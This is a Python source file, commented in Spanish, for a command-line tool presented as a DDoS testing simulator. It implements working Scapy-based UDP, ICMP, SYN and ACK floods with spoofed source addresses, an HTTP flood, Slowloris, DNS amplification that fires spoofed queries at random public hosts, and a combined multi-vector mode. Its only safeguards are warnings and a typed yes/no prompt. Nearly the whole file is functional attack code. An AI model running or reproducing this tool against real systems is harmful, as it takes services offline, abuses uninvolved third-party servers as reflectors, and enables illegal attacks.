#!/usr/bin/env python3
"""
DDoS Attack Simulator - Testing Tool
======================================
ADVERTENCIA: Esta herramienta es SOLO para testing en entornos aislados.
USO NO AUTORIZADO ES ILEGAL.

Esta herramienta simula diferentes tipos de ataques DDoS para probar
sistemas de mitigación en entornos controlados.
"""

import argparse
import random
import socket
import struct
import sys
import time
import threading
from datetime import datetime
from typing import List, Optional
import multiprocessing as mp

try:
    from scapy.all import (
        IP, TCP, UDP, ICMP, DNS, DNSQR, Raw,
        send, sr1, conf
    )
except ImportError:
    print("Error: Scapy no está instalado. Ejecuta: pip install scapy")
    sys.exit(1)


class Colors:
    """ANSI color codes para output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'


class DDoSSimulator:
    """Simulador de ataques DDoS para testing"""

    def __init__(self, target_ip: str, target_port: int = 80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
        self.stats = {
            'packets_sent': 0,
            'start_time': None,
            'attack_type': None
        }

        # Deshabilitar verbose de Scapy
        conf.verb = 0

    def print_banner(self):
        """Muestra el banner de la herramienta"""
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║          DDoS ATTACK SIMULATOR - TESTING TOOL                ║
║                    Thrall Defender                           ║
╚══════════════════════════════════════════════════════════════╝
{Colors.RESET}
{Colors.YELLOW}⚠️  ADVERTENCIA: Solo para testing en entornos controlados{Colors.RESET}
{Colors.RED}⚠️  El uso no autorizado es ILEGAL{Colors.RESET}

Target: {Colors.GREEN}{self.target_ip}:{self.target_port}{Colors.RESET}
"""
        print(banner)

    def random_ip(self) -> str:
        """Genera una IP aleatoria para simular ataque distribuido"""
        # Evitar rangos privados y especiales
        while True:
            ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
            # Evitar rangos privados
            if not (ip.startswith('10.') or ip.startswith('192.168.') or
                    ip.startswith('172.16.') or ip.startswith('127.')):
                return ip

    def update_stats(self, packets: int = 1):
        """Actualiza estadísticas"""
        self.stats['packets_sent'] += packets

    def print_stats(self):
        """Muestra estadísticas en tiempo real"""
        if self.stats['start_time']:
            elapsed = time.time() - self.stats['start_time']
            pps = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0

            print(f"\r{Colors.CYAN}[{datetime.now().strftime('%H:%M:%S')}]{Colors.RESET} "
                  f"{Colors.BOLD}{self.stats['attack_type']}{Colors.RESET} | "
                  f"Packets: {Colors.GREEN}{self.stats['packets_sent']:,}{Colors.RESET} | "
                  f"Rate: {Colors.YELLOW}{pps:.0f} pps{Colors.RESET} | "
                  f"Time: {Colors.MAGENTA}{elapsed:.1f}s{Colors.RESET}", end='', flush=True)

    # ==================== VOLUMETRIC ATTACKS ====================

    def udp_flood(self, duration: int = 60, intensity: str = 'medium'):
        """
        UDP Flood - Ataque volumétrico clásico
        Inunda el objetivo con paquetes UDP a puertos aleatorios
        """
        self.stats['attack_type'] = 'UDP FLOOD'
        self.stats['start_time'] = time.time()

        # Intensidades (paquetes por iteración)
        intensities = {'low': 10, 'medium': 50, 'high': 100, 'extreme': 200}
        burst_size = intensities.get(intensity, 50)

        print(f"\n{Colors.BOLD}[+] Iniciando UDP Flood (Intensidad: {intensity}){Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Duración: {duration}s | Burst: {burst_size} paquetes{Colors.RESET}\n")

        end_time = time.time() + duration

        try:
            while time.time() < end_time and self.running:
                # Crear ráfaga de paquetes
                packets = []
                for _ in range(burst_size):
                    src_ip = self.random_ip()
                    dst_port = random.randint(1, 65535)

                    # Payload aleatorio
                    payload = bytes([random.randint(0, 255) for _ in range(random.randint(64, 1024))])

                    packet = IP(src=src_ip, dst=self.target_ip) / UDP(dport=dst_port) / Raw(load=payload)
                    packets.append(packet)

                # Enviar ráfaga
                send(packets, verbose=0)
                self.update_stats(len(packets))
                self.print_stats()

                # Pequeña pausa para no saturar completamente
                time.sleep(0.01)

        except KeyboardInterrupt:
            pass
        finally:
            print(f"\n{Colors.GREEN}[✓] UDP Flood completado{Colors.RESET}\n")

    def icmp_flood(self, duration: int = 60, intensity: str = 'medium'):
        """
        ICMP Flood (Ping of Death variant)
        Inunda con paquetes ICMP de gran tamaño
        """
        self.stats['attack_type'] = 'ICMP FLOOD'
        self.stats['start_time'] = time.time()

        intensities = {'low': 5, 'medium': 20, 'high': 50, 'extreme': 100}
        burst_size = intensities.get(intensity, 20)

        print(f"\n{Colors.BOLD}[+] Iniciando ICMP Flood (Intensidad: {intensity}){Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Duración: {duration}s{Colors.RESET}\n")

        end_time = time.time() + duration

        try:
            while time.time() < end_time and self.running:
                packets = []
                for _ in range(burst_size):
                    src_ip = self.random_ip()
                    # Payload grande para simular Ping of Death
                    payload = bytes([random.randint(0, 255) for _ in range(random.randint(1000, 5000))])

                    packet = IP(src=src_ip, dst=self.target_ip) / ICMP() / Raw(load=payload)
                    packets.append(packet)

                send(packets, verbose=0)
                self.update_stats(len(packets))
                self.print_stats()
                time.sleep(0.02)

        except KeyboardInterrupt:
            pass
        finally:
            print(f"\n{Colors.GREEN}[✓] ICMP Flood completado{Colors.RESET}\n")

    # ==================== PROTOCOL ATTACKS ====================

    def syn_flood(self, duration: int = 60, intensity: str = 'medium'):
        """
        SYN Flood - Ataque de agotamiento de conexiones
        Envía paquetes SYN sin completar el handshake
        """
        self.stats['attack_type'] = 'SYN FLOOD'
        self.stats['start_time'] = time.time()

        intensities = {'low': 10, 'medium': 50, 'high': 150, 'extreme': 300}
        burst_size = intensities.get(intensity, 50)

        print(f"\n{Colors.BOLD}[+] Iniciando SYN Flood (Intensidad: {intensity}){Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Objetivo: {self.target_ip}:{self.target_port}{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Duración: {duration}s{Colors.RESET}\n")

        end_time = time.time() + duration

        try:
            while time.time() < end_time and self.running:
                packets = []
                for _ in range(burst_size):
                    src_ip = self.random_ip()
                    src_port = random.randint(1024, 65535)
                    seq_num = random.randint(0, 4294967295)

                    # SYN flag con parámetros aleatorios
                    packet = IP(src=src_ip, dst=self.target_ip) / TCP(
                        sport=src_port,
                        dport=self.target_port,
                        flags='S',
                        seq=seq_num,
                        window=random.randint(1000, 65535)
                    )
                    packets.append(packet)

                send(packets, verbose=0)
                self.update_stats(len(packets))
                self.print_stats()
                time.sleep(0.01)

        except KeyboardInterrupt:
            pass
        finally:
            print(f"\n{Colors.GREEN}[✓] SYN Flood completado{Colors.RESET}\n")

    def ack_flood(self, duration: int = 60, intensity: str = 'medium'):
        """
        ACK Flood - Inunda con paquetes ACK inválidos
        Fuerza al objetivo a procesar paquetes de conexiones inexistentes
        """
        self.stats['attack_type'] = 'ACK FLOOD'
        self.stats['start_time'] = time.time()

        intensities = {'low': 15, 'medium': 60, 'high': 150, 'extreme': 300}
        burst_size = intensities.get(intensity, 60)

        print(f"\n{Colors.BOLD}[+] Iniciando ACK Flood (Intensidad: {intensity}){Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Duración: {duration}s{Colors.RESET}\n")

        end_time = time.time() + duration

        try:
            while time.time() < end_time and self.running:
                packets = []
                for _ in range(burst_size):
                    src_ip = self.random_ip()
                    src_port = random.randint(1024, 65535)

                    packet = IP(src=src_ip, dst=self.target_ip) / TCP(
                        sport=src_port,
                        dport=self.target_port,
                        flags='A',
                        seq=random.randint(0, 4294967295),
                        ack=random.randint(0, 4294967295)
                    )
                    packets.append(packet)

                send(packets, verbose=0)
                self.update_stats(len(packets))
                self.print_stats()
                time.sleep(0.01)

        except KeyboardInterrupt:
            pass
        finally:
            print(f"\n{Colors.GREEN}[✓] ACK Flood completado{Colors.RESET}\n")

    # ==================== APPLICATION LAYER ATTACKS ====================

    def http_flood(self, duration: int = 60, intensity: str = 'medium'):
        """
        HTTP Flood - Ataque de capa 7
        Envía múltiples peticiones HTTP GET/POST válidas
        """
        self.stats['attack_type'] = 'HTTP FLOOD'
        self.stats['start_time'] = time.time()

        intensities = {'low': 5, 'medium': 20, 'high': 50, 'extreme': 100}
        burst_size = intensities.get(intensity, 20)

        print(f"\n{Colors.BOLD}[+] Iniciando HTTP Flood (Intensidad: {intensity}){Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Duración: {duration}s{Colors.RESET}\n")

        # User agents realistas
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)",
        ]

        paths = [
            "/", "/index.html", "/api/data", "/search?q=test",
            "/products", "/login", "/admin", "/api/users"
        ]

        end_time = time.time() + duration

        try:
            while time.time() < end_time and self.running:
                packets = []
                for _ in range(burst_size):
                    src_ip = self.random_ip()
                    src_port = random.randint(1024, 65535)
                    path = random.choice(paths)
                    user_agent = random.choice(user_agents)

                    # Construir petición HTTP GET
                    http_request = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}\r\n"
                        f"User-Agent: {user_agent}\r\n"
                        f"Accept: */*\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                    )

                    packet = IP(src=src_ip, dst=self.target_ip) / TCP(
                        sport=src_port,
                        dport=self.target_port,
                        flags='PA'
                    ) / Raw(load=http_request)

                    packets.append(packet)

                send(packets, verbose=0)
                self.update_stats(len(packets))
                self.print_stats()
                time.sleep(0.05)

        except KeyboardInterrupt:
            pass
        finally:
            print(f"\n{Colors.GREEN}[✓] HTTP Flood completado{Colors.RESET}\n")

    def slowloris(self, duration: int = 60, connections: int = 200):
        """
        Slowloris - Ataque de bajo ancho de banda pero muy efectivo
        Mantiene conexiones abiertas enviando headers HTTP parciales
        """
        self.stats['attack_type'] = 'SLOWLORIS'
        self.stats['start_time'] = time.time()

        print(f"\n{Colors.BOLD}[+] Iniciando Slowloris Attack{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Conexiones: {connections} | Duración: {duration}s{Colors.RESET}\n")

        sockets_list = []

        def create_socket():
            """Crea una conexión y envía header parcial"""
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target_ip, self.target_port))

                # Enviar header inicial
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                s.send(f"User-Agent: {random.randint(0, 2000)}\r\n".encode())
                s.send(f"Accept-language: en-US,en,q=0.5\r\n".encode())

                return s
            except:
                return None

        # Crear conexiones iniciales
        print(f"{Colors.CYAN}[*] Estableciendo {connections} conexiones...{Colors.RESET}")
        for _ in range(connections):
            s = create_socket()
            if s:
                sockets_list.append(s)

        print(f"{Colors.GREEN}[✓] {len(sockets_list)} conexiones establecidas{Colors.RESET}\n")

        end_time = time.time() + duration

        try:
            while time.time() < end_time and self.running:
                # Mantener conexiones vivas enviando headers parciales
                for s in list(sockets_list):
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        self.update_stats(1)
                    except:
                        sockets_list.remove(s)
                        # Intentar crear nueva conexión
                        new_s = create_socket()
                        if new_s:
                            sockets_list.append(new_s)

                self.print_stats()
                time.sleep(15)  # Enviar keep-alive cada 15 segundos

        except KeyboardInterrupt:
            pass
        finally:
            # Cerrar todas las conexiones
            for s in sockets_list:
                try:
                    s.close()
                except:
                    pass
            print(f"\n{Colors.GREEN}[✓] Slowloris completado{Colors.RESET}\n")

    # ==================== AMPLIFICATION ATTACKS ====================

    def dns_amplification(self, duration: int = 60, intensity: str = 'medium'):
        """
        DNS Amplification - Simula ataque de amplificación DNS
        Envía queries DNS con IP de origen falsificada
        """
        self.stats['attack_type'] = 'DNS AMPLIFICATION'
        self.stats['start_time'] = time.time()

        intensities = {'low': 5, 'medium': 15, 'high': 30, 'extreme': 60}
        burst_size = intensities.get(intensity, 15)

        print(f"\n{Colors.BOLD}[+] Iniciando DNS Amplification (Intensidad: {intensity}){Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Duración: {duration}s{Colors.RESET}\n")

        # Dominios que generan respuestas grandes
        domains = [
            "google.com", "facebook.com", "amazon.com", "microsoft.com",
            "cloudflare.com", "akamai.com"
        ]

        end_time = time.time() + duration

        try:
            while time.time() < end_time and self.running:
                packets = []
                for _ in range(burst_size):
                    src_ip = self.random_ip()
                    domain = random.choice(domains)

                    # Query DNS tipo ANY (genera respuestas grandes)
                    packet = IP(src=self.target_ip, dst=src_ip) / UDP(dport=53) / DNS(
                        rd=1,
                        qd=DNSQR(qname=domain, qtype='ANY')
                    )
                    packets.append(packet)

                send(packets, verbose=0)
                self.update_stats(len(packets))
                self.print_stats()
                time.sleep(0.1)

        except KeyboardInterrupt:
            pass
        finally:
            print(f"\n{Colors.GREEN}[✓] DNS Amplification completado{Colors.RESET}\n")

    # ==================== MULTI-VECTOR ATTACKS ====================

    def multi_vector_attack(self, duration: int = 60):
        """
        Multi-Vector Attack - Combina varios tipos de ataques simultáneamente
        Este es el más difícil de mitigar
        """
        print(f"\n{Colors.BOLD}{Colors.RED}[!] Iniciando MULTI-VECTOR ATTACK{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Combinando: SYN Flood + UDP Flood + HTTP Flood{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Duración total: {duration}s{Colors.RESET}\n")

        self.running = True

        # Crear threads para cada tipo de ataque
        threads = []

        # SYN Flood thread
        t1 = threading.Thread(target=self.syn_flood, args=(duration, 'high'))
        threads.append(t1)

        # UDP Flood thread
        t2 = threading.Thread(target=self.udp_flood, args=(duration, 'high'))
        threads.append(t2)

        # HTTP Flood thread
        t3 = threading.Thread(target=self.http_flood, args=(duration, 'medium'))
        threads.append(t3)

        try:
            # Iniciar todos los ataques
            for t in threads:
                t.start()
                time.sleep(0.5)  # Pequeño delay entre inicios

            # Esperar a que terminen
            for t in threads:
                t.join()

        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Colors.RED}[!] Deteniendo ataque multi-vector...{Colors.RESET}")
            for t in threads:
                t.join(timeout=2)

        print(f"\n{Colors.GREEN}[✓] Multi-vector attack completado{Colors.RESET}\n")


def main():
    parser = argparse.ArgumentParser(
        description='DDoS Attack Simulator - Testing Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos de uso:

  # SYN Flood básico
  sudo python3 ddos_simulator.py -t 192.168.1.100 -a syn_flood -d 30

  # UDP Flood intenso
  sudo python3 ddos_simulator.py -t 192.168.1.100 -a udp_flood -i extreme -d 60

  # Ataque multi-vector (el más difícil)
  sudo python3 ddos_simulator.py -t 192.168.1.100 -a multi_vector -d 120

  # Slowloris con 500 conexiones
  sudo python3 ddos_simulator.py -t 192.168.1.100 -p 80 -a slowloris -c 500

⚠️  IMPORTANTE: Ejecutar con sudo para acceso raw sockets
⚠️  Solo usar en entornos de testing autorizados
        """
    )

    parser.add_argument('-t', '--target', required=True, help='IP objetivo')
    parser.add_argument('-p', '--port', type=int, default=80, help='Puerto objetivo (default: 80)')
    parser.add_argument('-a', '--attack', required=True,
                       choices=['udp_flood', 'icmp_flood', 'syn_flood', 'ack_flood',
                               'http_flood', 'slowloris', 'dns_amp', 'multi_vector'],
                       help='Tipo de ataque')
    parser.add_argument('-d', '--duration', type=int, default=60,
                       help='Duración en segundos (default: 60)')
    parser.add_argument('-i', '--intensity', choices=['low', 'medium', 'high', 'extreme'],
                       default='medium', help='Intensidad del ataque (default: medium)')
    parser.add_argument('-c', '--connections', type=int, default=200,
                       help='Conexiones para Slowloris (default: 200)')

    args = parser.parse_args()

    # Verificar que se ejecuta con privilegios
    import os
    if os.geteuid() != 0:
        print(f"{Colors.RED}Error: Este script requiere privilegios root (usar sudo){Colors.RESET}")
        sys.exit(1)

    # Crear simulador
    simulator = DDoSSimulator(args.target, args.port)
    simulator.print_banner()

    # Confirmación de seguridad
    print(f"{Colors.YELLOW}¿Estás autorizado para realizar este test? (sí/no): {Colors.RESET}", end='')
    response = input().strip().lower()
    if response not in ['sí', 'si', 's', 'yes', 'y']:
        print(f"{Colors.RED}Test cancelado.{Colors.RESET}")
        sys.exit(0)

    simulator.running = True

    # Ejecutar ataque seleccionado
    try:
        if args.attack == 'udp_flood':
            simulator.udp_flood(args.duration, args.intensity)
        elif args.attack == 'icmp_flood':
            simulator.icmp_flood(args.duration, args.intensity)
        elif args.attack == 'syn_flood':
            simulator.syn_flood(args.duration, args.intensity)
        elif args.attack == 'ack_flood':
            simulator.ack_flood(args.duration, args.intensity)
        elif args.attack == 'http_flood':
            simulator.http_flood(args.duration, args.intensity)
        elif args.attack == 'slowloris':
            simulator.slowloris(args.duration, args.connections)
        elif args.attack == 'dns_amp':
            simulator.dns_amplification(args.duration, args.intensity)
        elif args.attack == 'multi_vector':
            simulator.multi_vector_attack(args.duration)

    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Test interrumpido por el usuario{Colors.RESET}")

    # Resumen final
    print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
    print(f"{Colors.CYAN}RESUMEN DEL TEST{Colors.RESET}")
    print(f"{Colors.BOLD}{'='*60}{Colors.RESET}")
    print(f"Tipo de ataque: {Colors.GREEN}{args.attack}{Colors.RESET}")
    print(f"Paquetes enviados: {Colors.GREEN}{simulator.stats['packets_sent']:,}{Colors.RESET}")
    if simulator.stats['start_time']:
        elapsed = time.time() - simulator.stats['start_time']
        pps_avg = simulator.stats['packets_sent'] / elapsed if elapsed > 0 else 0
        print(f"Duración total: {Colors.GREEN}{elapsed:.2f}s{Colors.RESET}")
        print(f"Tasa promedio: {Colors.GREEN}{pps_avg:.0f} pps{Colors.RESET}")
    print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\n")


if __name__ == '__main__':
    main()
